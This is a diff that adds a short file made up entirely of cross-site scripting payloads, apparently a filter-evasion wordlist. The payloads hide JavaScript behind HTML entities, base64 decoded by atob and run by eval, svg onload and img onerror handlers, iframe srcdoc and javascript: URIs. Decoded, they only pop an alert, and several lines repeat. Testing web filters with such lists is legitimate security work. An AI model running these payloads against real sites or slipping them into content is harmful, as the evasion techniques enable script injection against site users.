@@ -1,0 +1,13 @@
+<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;">
+<iframe src="javascript:&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#x3a;&#97;&#108;&#101;&#114;&#116;&#x28;&#39;&#88;&#83;&#83;&#39;&#x29;">
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>">
+<iframe srcdoc="<svg onload=setTimeout('eval(atob(`YWxlcnQoJ1hTUycp`))',0)>">
+<svg onload="eval(atob('YWxlcnQoJ1hTUycp'))">
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>">
+<svg onload="setTimeout('eval(atob(`YWxlcnQoJ1hTUycp`))',0)">
+<svg onload="eval('&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x22;&#x58;&#x53;&#x53;&#x22;&#x29;')">
+<iframe srcdoc="<svg onload=eval('&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x22;&#x58;&#x53;&#x53;&#x22;&#x29;')>">
+<svg onload="setTimeout('eval(atob(`YWxlcnQoJ1hTUycp`))',0)">
+<svg onload="eval(atob('YWxlcnQoJ1hTUycp'))">
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>">
+<svg onload="setTimeout('eval(atob(`YWxlcnQoJ1hTUycp`))',0)">
